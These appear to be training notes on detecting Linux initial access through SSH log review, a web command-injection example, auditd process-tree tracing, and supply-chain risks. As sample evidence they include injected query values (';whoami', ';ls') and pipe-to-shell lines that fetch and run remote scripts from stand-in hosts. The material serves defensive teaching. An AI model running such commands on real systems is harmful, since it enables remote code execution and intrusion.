# Linux Initial Access — SSH, Exposed Services & Process Tree Detection

## Overview

This document covers how attackers gain Initial Access to Linux systems and how to detect it using Linux logs: the popularity and risks of SSH (T1133) with a breach example and detection workflow, public-facing services (T1190) and application logs with a worked command injection example, building a process tree with auditd, human-led attacks such as pipe-to-shell and typosquatted packages, supply chain compromise, and the summary approach of tracing every technique through process tree analysis.

---

With AI, cloud computing, and IoT growth, Linux systems are more widespread than ever — yet most Linux breaches still start with common, well-known Initial Access techniques. This section covers how to detect them using the Linux log sources from Section 103.

---

### Popularity of SSH

**SSH** is one of the most popular Linux Initial Access vectors — a near-universal remote access service. Shodan reported over **40 million** Internet-facing machines with SSH exposed in 2025, concentrated notably in China and the US. Some admins enforce key-based auth; many still rely on weak passwords, leaving systems open to brute force.

### Initial Access via SSH

Much like RDP on Windows, SSH is powerful but often poorly defended — both are tracked under the **External Remote Services (T1133)** MITRE technique. Threat groups run large botnets scanning the Internet for exposed SSH, gaining access via a **stolen key** or a **breached password**.

**Key-based authentication risks:**

- Attackers compromise a service or source repository where private SSH keys are stored (e.g., a GitHub repo, an Ansible automation server)
- Attackers steal SSH keys by infecting an admin's laptop with a data stealer

**Password-based authentication risks:**

- An admin sets a weak password for a quick test and forgets to revert it
- IT support enables SSH for a contractor who sets the password to `12345678`
- A network engineer accidentally exposes an old, insecure SSH server

> Most real-world Linux attacks (e.g., by the **Outlaw** group) start from one of these scenarios. More advanced risks — a vulnerability in the SSH server itself (e.g., **Erlang/OTP**) or SSH session hijacking — are separate, deeper topics.

### SSH Breach Example

Scenario: an admin enables public SSH with password-based auth and sets a weak password for a support account — a combination that inevitably ends in a breach. Three indicators of malicious logins to watch for: **brute-force failures**, a **successful login from an untrusted external IP**, and an **irregular login time**.

### Detecting SSH Attacks

Linux log analysis is comparatively simple — no "logon type" field maze like Windows. Start by listing successful SSH logins and reviewing a handful of key fields:

```
cat /var/log/auth.log | grep -E 'Accepted'

2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 10.14.105.255 port 18442 ssh2: [...]
2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2
2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2
```

**Login of `ansible`** — appears legitimate: public-key auth, from an internal IP, at a time consistent with periodic automation. Still worth confirming `10.14.105.255` is really the Ansible server and checking the account's follow-on activity.

**Logins of `jsmith`** — three red flags: password-based auth, external source IPs, and an odd login time (one login lands at an unusual hour for the user). Before a final verdict, dig further into:

- **Username** — who owns the account, and is this time/IP expected for them?
- **Source IP** — what do threat-intel tools and asset lookups say about it?
- **Login history** — was the login preceded by a brute force or other suspicious activity?
- **Next steps** — is it suspicious enough to warrant analyzing the user's post-login actions?

---

### Linux and Public Services (T1190)

Linux hosts frequently run public-facing services — web servers, mail servers, databases, dev/IT management tools — and form the backbone of most firewall/VPN appliances. Compromising any one of these puts the whole host at risk, tracked under **Exploit Public-Facing Application (T1190)**.

**Real-world examples:**

- A CVE in **Zimbra Collaboration** allowed arbitrary OS command execution
- An exposed **Docker API port** served as an entry point across a series of cloud breaches
- A CVE in **Palo Alto firewalls** granted full OS control on the Linux-based appliance
- The **WordPress "plugins"** feature is often abused to upload web shells

> **Pattern:** brute-force the WordPress admin panel → upload a backdoor from inside the compromised app.

### Using Application Logs

Application logs rarely spell out "I am being exploited right now" — but they still yield useful artifacts:

- Web logs → detect web attacks
- Database logs → detect suspicious SQL queries
- VPN logs → detect abnormal login events
- Other app logs → specific domain events (e.g., financial transactions)

### Web as Initial Access — Worked Example

Scenario: a simple internal web app, **TryPingMe**, runs `ping -c 2 [YOUR-INPUT]` server-side with no input filtering — a textbook command injection. Spotting the exploitation in the web logs:

```
cat /var/log/nginx/access.log

10.2.33.10  - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...]
10.12.88.67 - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]
```

Instead of an IP address, `10.14.105.255` puts Linux commands in the query parameter — a clear command-injection signature. From web logs alone:

- `10.14.105.255` is likely the attacker
- The `/ping` endpoint allows code execution
- The attacker already ran `whoami` and `ls`
- The whole system is now at risk because of this single vulnerable endpoint

---

### Building a Process Tree

Application logs aren't always available or sufficient — most SOC teams instead rely on **process tree analysis**, a universal way to unwrap Initial Access (see Wiz's writeup on Selenium server breaches for a real example). Typical trigger: an alert fires on a suspicious command (e.g., `whoami`). Was it IT activity, or a breach? Trace the command back through its parent processes to find out.

#### Auditd and Process Tree — Worked Example

Start by locating the suspicious command, then walk the process tree upward by PID until reaching PID 1:

```
# Step 1 — find the command (-x filters by command name)
ausearch -i -x whoami
type=SYSCALL [...] ppid=3905 pid=3907 auid=unset uid=ubuntu exe=/usr/bin/whoami key=exec

# Step 2 — trace the parent (ppid 3905)
ausearch -i --pid 3905
type=PROCTITLE proctitle=/bin/sh -c whoami
type=SYSCALL [...] ppid=3898 pid=3905 exe=/usr/bin/dash key=exec

# Step 3 — trace the grandparent (ppid 3898)
ausearch -i --pid 3898
type=PROCTITLE proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL [...] ppid=1 pid=3898 exe=/usr/bin/python3.12 key=exec
```

The tree shows `whoami` was ultimately launched by a Python web app (`/opt/mywebapp/app.py`) — raising the question of whether the app itself was breached. To go further, list **all** child processes of that app to look for more damning evidence:

```
ausearch -i --ppid 3898 | grep 'proctitle'

proctitle=/bin/sh -c whoami
proctitle=/bin/sh -c ls -la
proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
```

That last line — a `curl | sh` pulling and executing a remote payload — is clear confirmation of a breach via the web application.

---

### Human-Led Attacks on Linux

Phishing and USB attacks are far less common on Linux (primarily a server OS run by technical staff), but the risk isn't zero:

| Scenario | Example | Consequence |
|---|---|---|
| Pipe-to-shell from an untrusted source | `curl https://shadyforum.thm/fix.sh \| bash` run without reviewing the script | Silent server infection |
| Typosquatted package install | `pip3 install fastpi` (meant `fastapi`) | Installs threat-actor-published malware |

### Supply Chain Compromise

Not unique to Linux, but highly relevant given how many dependencies a typical Linux server relies on — a Supply Chain Compromise breaches the software itself, then infects every downstream user via a malicious update.

- The **XZ Utils** backdoor, embedded in software tied to SSH, nearly compromised millions of Linux servers
- The **tj-actions** breach leaked thousands of secrets, including SSH keys and access tokens

### Detecting the Attacks — Summary Approach

Every Initial Access technique in this section can be uncovered through process tree analysis:

1. Start from a trigger — a SIEM alert on a suspicious command, or a connection to a known-malicious IP
2. Build the process tree to trace which application or user initiated the activity (web server, internal app, admin's SSH session)
3. Determine whether the activity is legitimate or malicious based on context, source, and what else that process tree reveals

---

### Quick Reference

| Topic | Key Detail |
|---|---|
| SSH exposure scale | 40M+ Internet-facing machines (Shodan, 2025) |
| SSH MITRE technique | T1133 — External Remote Services |
| Key-based access risks | Stolen keys from repos/automation servers, infected admin laptops |
| Password-based access risks | Weak test passwords, contractor accounts, forgotten exposed servers |
| Real-world Linux SSH attacker | Outlaw group |
| SSH login detection | `grep 'Accepted' /var/log/auth.log` — check auth method, source IP, and timing |
| Public service MITRE technique | T1190 — Exploit Public-Facing Application |
| Public service breach examples | Zimbra CVE, exposed Docker API, Palo Alto firewall CVE, WordPress plugin abuse |
| Web command injection tell | Commands instead of expected input inside query parameters |
| Process tree trigger | A suspicious command or connection to a known-bad IP |
| Auditd process tree pivots | `ausearch -x <command>`, `ausearch --pid <ppid>`, `ausearch --ppid <pid>` |
| Human-led Linux risks | Pipe-to-shell installs, typosquatted packages |
| Supply chain examples | XZ Utils backdoor, tj-actions secret leak |

---

## Summary

- **SSH** is one of the most popular Linux Initial Access vectors (over 40 million Internet-facing machines per Shodan in 2025) and, like RDP on Windows, falls under **External Remote Services (T1133)**; attackers get in through **stolen keys** (from repos, automation servers, or data stealers on admin laptops) or **breached passwords** (weak test passwords, contractor accounts, forgotten exposed servers), as in attacks by the Outlaw group.
- SSH attacks are detected with `grep 'Accepted' /var/log/auth.log`, reviewing the **auth method, source IP, and login time**: an `ansible` public-key login from an internal IP at a consistent time looks legitimate, while `jsmith` logging in with a password from external IPs at an odd hour raises three red flags — to be confirmed by checking the account owner, threat intel on the source IP, login history for a preceding brute force, and the user's post-login actions.
- Public-facing services fall under **Exploit Public-Facing Application (T1190)** — examples include a Zimbra CVE, an exposed Docker API, a Palo Alto firewall CVE, and WordPress plugin abuse — and application logs (web, database, VPN) reveal them, such as a command injection in a web app where `/ping?host=;whoami` and `;ls` put Linux commands into a query parameter.
- **Process tree analysis** is the universal approach: start from a suspicious command, then walk upward with auditd (`ausearch -i -x whoami`, then `--pid` on each parent) until the origin appears (here a Python web app), and list its children with `--ppid` to find `curl http://... | sh` — confirming the breach.
- **Human-led** Linux attacks (pipe-to-shell installs like `curl ... | bash`, typosquatted packages like `fastpi`) and **supply chain compromises** (the XZ Utils backdoor, the tj-actions secret leak) are rarer but real, and every technique here can be uncovered by tracing a trigger back through its process tree to judge whether the activity is legitimate.

